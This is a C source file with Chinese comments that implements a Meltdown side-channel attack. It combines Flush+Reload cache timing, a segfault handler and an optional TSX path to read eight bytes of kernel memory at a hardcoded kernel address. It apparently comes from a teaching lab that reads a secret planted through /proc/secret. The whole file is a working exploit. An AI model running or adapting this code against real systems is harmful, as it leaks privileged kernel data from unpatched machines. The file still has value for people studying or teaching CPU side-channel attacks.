#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <fcntl.h>
#include <emmintrin.h>
#include <x86intrin.h>

// 
uint8_t array[256*4096];

// Cache 命中的阈值 
#define CACHE_HIT_THRESHOLD (200)
#define DELTA 0 
#define secret_addr 0xffffffffc04f5000

// 保存堆栈上下文
static sigjmp_buf jbuf;

 //计分数组 
static  int scores[256];

/*********************** Flush + Reload ************************/
//FLUSH 
void flushSideChannel()
{
  int i;
  //从Cache 中FLUSH array
  for (i = 0; i < 256; i++) 
      _mm_clflush(&array[i*4096 + DELTA]);
}


//RELOAD 
void reloadSideChannelImproved()
{
  int i;
  volatile uint8_t *addr;
  register uint64_t time1, time2;
  int junk = 0;
  for (i = 0; i < 256; i++) {
     addr = &array[i * 4096 + DELTA];
     time1 = __rdtscp(&junk);
     junk = *addr;
     time2 = __rdtscp(&junk) - time1;
     
     // RELOAD 时间小于 Cache hit 阈值，认为攻击命中
     if (time2 <= CACHE_HIT_THRESHOLD)
        scores[i]++; 
  }
}
/*********************** Flush + Reload ************************/

//执行meltdown攻击（c语言），让ALU 忙碌起来显得尤为重要
void meltdown(unsigned long kernel_data_addr)
{
   char kernel_data;
   
   // 让 ALU 忙碌起来 
   // 当CPU执行这段asm代码时，由于内存获取单元处于空闲状态，它们会无序地提前获取内核数据，这增加了成功的可能性。
   asm volatile(
       ".rept 400;"                
       "add $0x142, %%ebx;"
       ".endr;"                    
       :
       :
       : "ebx"
   ); 
    
   // 这里访问内核地址会抛出异常 
   kernel_data = *(char*)kernel_data_addr;  
   
   // 用内核地址数据进行计算 
   array[kernel_data * 4096 + DELTA] += 1;              
}

//执行meltdown攻击（汇编实现）
void meltdown_asm(unsigned long kernel_data_addr){
    // asm volatile(
    //     ".rept 400;"                
    //     "add $0x142, %%ebx;"
    //     ".endr;"                    
    //     :
    //     :
    //     : "ebx"
    // ); 
    asm volatile(
        "1:\n"                                                          \
        "movq (%%rsi), %%rsi\n"                                         \
        "movzx (%%rcx), %%rax\n"                                        \
        "shl $12, %%rax\n"                                              \
        "jz 1\n"                                                       \
        "movq (%%rbx,%%rax), %%rbx\n"                                 \
        :                                                               \
        : "c"(kernel_data_addr), "b"(array),"S"(0)                                   \
        : "rax"           
    );
}

// tsx
static __attribute__((always_inline)) inline unsigned int xbegin(void) {
	int ret = (~0u);
	asm volatile(".byte 0xc7,0xf8 ; .long 0" : "+a" (ret) :: "memory");
	return ret;
}


// 异常处理函数 
static void catch_segv()
{
   siglongjmp(jbuf, 1);
}

// attack
void attack(int step,int *scores,int fd){
  int i,j,ret;
  
  for(i=0;i<256;i++){
      scores[i] = 0;
  }

  // 重复100次，取Scores最大的项 
  for (i = 0; i < 100; i++) {
    
      ret = pread(fd, NULL, 0, 0);
      if (ret < 0) {
        perror("pread");
        break;
      }


      // FLUSH
      flushSideChannel();

      //	meltdown

      // 异常处理
      if (sigsetjmp(jbuf, 1) == 0) { 
          meltdown(secret_addr+step); 
      }


      // TSX
      // if(xbegin() == (~0u)) {
      //   meltdown_asm(secret_addr+step); 
      // }
      
      // RELOAD 
      reloadSideChannelImproved();
  }

  // 找到命中次数最多最高的下标 
  int max = 0;
  for (i = 0; i < 256; i++) {
	  if (scores[max] < scores[i]) max = i;
  }

  printf("The secret value is %c\t\n",max);

}


int main()
{
  int i, j, ret = 0;
  
  // 绑定信号与处理函数 
  signal(SIGSEGV, catch_segv);

  //数组初始化
  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;

  // 用系统调用函数打开内核文件
  int fd = 0;
  fd = open("/proc/secret", O_RDONLY);
  if (fd < 0) {
    perror("open");
    return -1;
  }

  // 为scores分配空间 
  memset(scores, 0, sizeof(scores));
  
  //获取 Secret
  for(i=0; i<8;i++){
      attack(i,scores,fd);
  }


  return 0;
}
